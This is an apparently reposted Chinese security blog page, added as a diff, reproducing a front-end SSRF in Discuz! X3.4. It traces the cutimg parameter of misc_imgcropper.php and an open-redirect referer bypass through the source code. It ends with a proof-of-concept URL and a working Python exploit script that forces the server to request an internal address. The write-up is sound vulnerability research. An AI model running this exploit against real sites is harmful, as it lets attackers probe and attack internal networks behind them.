@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Discuz! X3.4 前台ssrf一、漏洞简介DDiscuz! X3.4source&#x2F;module&#x2F;misc&#x2F;misc_imgcropper.php页面中的cutimg参数，因为应用程序的远程下载功能过滤不严，配合前台任意URL跳转漏洞，可以造成SSRF漏洞，可以对与外部隔离的内部环境进行探测和攻击 二、漏洞影响   &lt;&#x3D; x3.4    windows    php&gt;5.3+ph">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Discuz/Discuz!%20X3.4%20%E5%89%8D%E5%8F%B0ssrf/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Discuz! X3.4 前台ssrf一、漏洞简介DDiscuz! X3.4source&#x2F;module&#x2F;misc&#x2F;misc_imgcropper.php页面中的cutimg参数，因为应用程序的远程下载功能过滤不严，配合前台任意URL跳转漏洞，可以造成SSRF漏洞，可以对与外部隔离的内部环境进行探测和攻击 二、漏洞影响   &lt;&#x3D; x3.4    windows    php&gt;5.3+ph">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId28.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId29.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId31.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId32.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId33.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId36.png">
+<meta property="article:published_time" content="2022-07-08T06:25:54.609Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.675Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Discuz!X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId25.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Discuz/Discuz! X3.4 前台ssrf" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Discuz/Discuz!%20X3.4%20%E5%89%8D%E5%8F%B0ssrf/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.609Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Discuz-X3-4-前台ssrf"><a href="#Discuz-X3-4-前台ssrf" class="headerlink" title="Discuz! X3.4 前台ssrf"></a>Discuz! X3.4 前台ssrf</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>DDiscuz! X3.4<br>source/module/misc/misc_imgcropper.php页面中的cutimg参数，因为应用程序的远程下载功能过滤不严，配合前台任意URL跳转漏洞，可以造成SSRF漏洞，可以对与外部隔离的内部环境进行探测和攻击</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><ul>
+<li><p>  &lt;= x3.4</p>
+</li>
+<li><p>  windows</p>
+</li>
+<li><p>  php&gt;5.3+php-curl&lt;=7.54</p>
+</li>
+<li><p>  DZ开放在80端口</p>
+</li>
+</ul>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>本地ssrf</strong></p>
+<p>/source/module/misc/misc_imgcropper.php 55行</p>
+<pre><code>    require_once libfile(&#39;class/image&#39;);    $image = new image();   $prefix = $_GET[&#39;picflag&#39;] == 2 ? $_G[&#39;setting&#39;][&#39;ftp&#39;][&#39;attachurl&#39;] : $_G[&#39;setting&#39;][&#39;attachurl&#39;]; if(!$image-&gt;Thumb($prefix.$_GET[&#39;cutimg&#39;], $cropfile, $picwidth, $picheight)) &#123;      showmessage(&#39;imagepreview_errorcode_&#39;.$image-&gt;errorcode, null, null, array(&#39;showdialog&#39; =&gt; true, &#39;closetime&#39; =&gt; true));    &#125;
+$prefix`可以通过GET传递`$_GET[&#39;picflag&#39;]`为2进行三元操作，变成了默认的`/`，然后和`$_GET[&#39;cutimg&#39;]`进行拼接作为第一个参数传进了`$image-&gt;Thumb
+</code></pre>
+<p>source/class/class_image.php 51行</p>
+<pre><code>    function Thumb($source, $target, $thumbwidth, $thumbheight, $thumbtype = 1, $nosuffix = 0) &#123;        $return = $this-&gt;init(&#39;thumb&#39;, $source, $target, $nosuffix); &#125;
+</code></pre>
+<p>拼接后的参数作为<code>$source</code>又传进了init函数</p>
+<p>source/class/class_image.php 118行</p>
+<pre><code>    function init($method, $source, $target, $nosuffix = 0) &#123;       global $_G;     $this-&gt;errorcode = 0;        if(empty($source)) &#123;            return -2;      &#125;       $parse = parse_url($source);        if(isset($parse[&#39;host&#39;])) &#123;         if(empty($target)) &#123;                return -2;          &#125;           $data = dfsockopen($source);            $this-&gt;tmpfile = $source = tempnam($_G[&#39;setting&#39;][&#39;attachdir&#39;].&#39;./temp/&#39;, &#39;tmpimg_&#39;);            if(!$data || $source === FALSE) &#123;               return -2;          &#125;           file_put_contents($source, $data);      &#125;
+</code></pre>
+<p>可以发现如果<code>$source</code>经过<code>parse_url</code>的解析结果中如果包含host字段就不结束流程，然后将<code>$source</code>参数传入<code>dfsockopen</code>函数。Php中的<code>parse_url</code>函数是可以对<code>//</code>开头的域名进行解析的,<br><code>$source</code>本身就是<code>/</code>开头，因此只需要通过开始的<code>$_GET[&#39;cutimg&#39;]</code>注入<code>/www.0-sec.org，变成</code>//<a target="_blank" rel="noopener" href="http://www.0-sec.org/%60%E5%8D%B3%E5%8F%AF%E7%BB%A7%E7%BB%AD%E6%89%A7%E8%A1%8C%E3%80%82">www.0-sec.org\`即可继续执行。</a></p>
+<p><img src="/resource/Discuz!X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId25.png"></p>
+<p>source/function/function_core.php 199行</p>
+<pre><code>function dfsockopen($url, $limit = 0, $post = &#39;&#39;, $cookie = &#39;&#39;, $bysocket = FALSE, $ip = &#39;&#39;, $timeout = 15, $block = TRUE, $encodetype  = &#39;URLENCODE&#39;, $allowcurl = TRUE, $position = 0, $files = array()) &#123;    require_once libfile(&#39;function/filesock&#39;);  return _dfsockopen($url, $limit, $post, $cookie, $bysocket, $ip, $timeout, $block, $encodetype, $allowcurl, $position, $files);&#125;
+</code></pre>
+<p>进入dfsockopen函数后，我们构造的字符串变为$url，然后传入了_dfsockopen函数。</p>
+<p>dz/source/function/function_filesock.php 31行</p>
+<p>image</p>
+<p>发起了curl请求，就是这里触发了ssrf，这里的现有使用后parse_url解析了一次$url，和上面的解析是一样的，然后又进行了拼接成为了curl的地址。</p>
+<p><img src="/resource/Discuz!X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId26.png"></p>
+<p>其$scheme为空，如果我们为cutimg传入/dz//member.php，那么到就会变成://dz//member.php</p>
+<p><img src="/resource/Discuz!X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId27.png"></p>
+<p>在php的curl中我们尝试访问://dz/forum.php</p>
+<p><img src="/resource/Discuz!X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId28.png"></p>
+<p>可以发现无指定协议的默认就是http协议，://是代表访问本地dz/forum.php表示路径和path，因此能够访问首页，到这里就有了一个可以对通网站下进行ssrf的漏洞点。</p>
+<p>Curl的配置当中开启了跳转</p>
+<p><img src="/resource/Discuz!X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId29.png"></p>
+<p>再找到一个站内的url跳转，就能绕过站内curl的限制，实现真正的ssrf。</p>
+<h3 id="前台任意url跳转"><a href="#前台任意url跳转" class="headerlink" title="前台任意url跳转"></a>前台任意url跳转</h3><p>/source/class/class_member.php 310行</p>
+<p><img src="/resource/Discuz!X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId31.png"></p>
+<p>调用了dreferer()结果作为跳转地址，继续跟进该函数。</p>
+<p>source/function/function_core.php 1498行</p>
+<p><img src="/resource/Discuz!X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId32.png"></p>
+<p><code>$_G[&#39;referer&#39;]</code>这个参数我们可控，同样使用了<code>parse_url</code>进行了解析，首先对协议进行了判断，需要属于<code>http/https</code>。</p>
+<p>然后又对host字段和<code>$_SERVER[&#39;HTTP_HOST&#39;]</code>进行了对比，判断是否在同一个域名下，因为攻击中是通过curl发起的请求，$_SERVER[‘HTTP_HOST’]此时为空，但是和www.进行了，因此这里域名为<code>www.</code>即可绕过判断成功注入location字段</p>
+<p>此时处理跳转的是php的curl，curl这里会因为<code>#@</code>出现解析问题，会跳转到192.168.2.63:6666，也就是形成ssrf。</p>
+<p><img src="/resource/Discuz!X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId33.png"></p>
+<p>站内ssrf-&gt;前台get型的任意url跳转-&gt;ssrf漏洞</p>
+<p><strong>总结</strong>：</p>
+<p>因为应用程序的远程下载功能过滤不严，利用php中的parse_url还有curl解析特性，配合前台任意URL跳转漏洞，可以造成SSRF漏洞。</p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>htp://www.0-sec.org/code-src/dz/Discuz_TC_BIG5/upload/member.php?mod=logging&amp;action=logout&amp;XDEBUG_SESSION_START=13904&amp;referer=http://localhost%23%40www.baidu.com&amp;quickforward=1
+</code></pre>
+<h3 id="python-脚本"><a href="#python-脚本" class="headerlink" title="python 脚本"></a>python 脚本</h3><pre><code># coding=utf-8
+import requests
+import re
+from urllib.parse import urlparse, quote
+from urllib import parse
+if __name__ == &quot;__main__&quot;:
+    url = &quot;http://192.168.66.129/dz/&quot;
+    ssrf_target = &quot;192.168.0.36:6666&quot;
+    path = urlparse(url).path
+    payload = quote(
+        &quot;/member.php?mod=logging&amp;action=logout&amp;quickforward=1&amp;referer=http://www.%23%40&#123;ssrf_target&#125;&quot;.format(
+            ssrf_target=ssrf_target))
+    s = requests.Session()
+    html = s.get(url).text
+    searchObj = re.search(r&#39;name=&quot;formhash&quot; value=&quot;(.*?)&quot;&#39;, html, re.M | re.I)
+    formhash = searchObj.group(1)
+    rs = s.post(
+        url + &quot;misc.php?mod=imgcropper&amp;imgcroppersubmit=1&amp;formhash=&#123;formhash&#125;&amp;picflag=2&amp;cutimg=&#123;path&#125;&#123;payload&#125;&quot;.format(
+            formhash=formhash, path=path, payload=payload))
+    exit()
+</code></pre>
+<p><img src="/resource/Discuz!X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId36.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="http://www.rai4over.cn/2018/12/07/Discuz-3-4%E5%89%8D%E5%8F%B0%E6%9C%89%E9%99%90%E5%88%B6SSRF%E6%BC%8F%E6%B4%9E/index.html">http://www.rai4over.cn/2018/12/07/Discuz-3-4%E5%89%8D%E5%8F%B0%E6%9C%89%E9%99%90%E5%88%B6SSRF%E6%BC%8F%E6%B4%9E/index.html</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Discuz/Discuz!%20X3.4%20%E5%89%8D%E5%8F%B0ssrf/" data-id="cl5c2qnsq0052y8v151js4h1l" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Discuz/Discuz!%20X3.4%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Discuz/Discuz!%20X3.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E9%85%8D%E5%90%88install%E8%BF%87%E7%A8%8Bgetshell/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
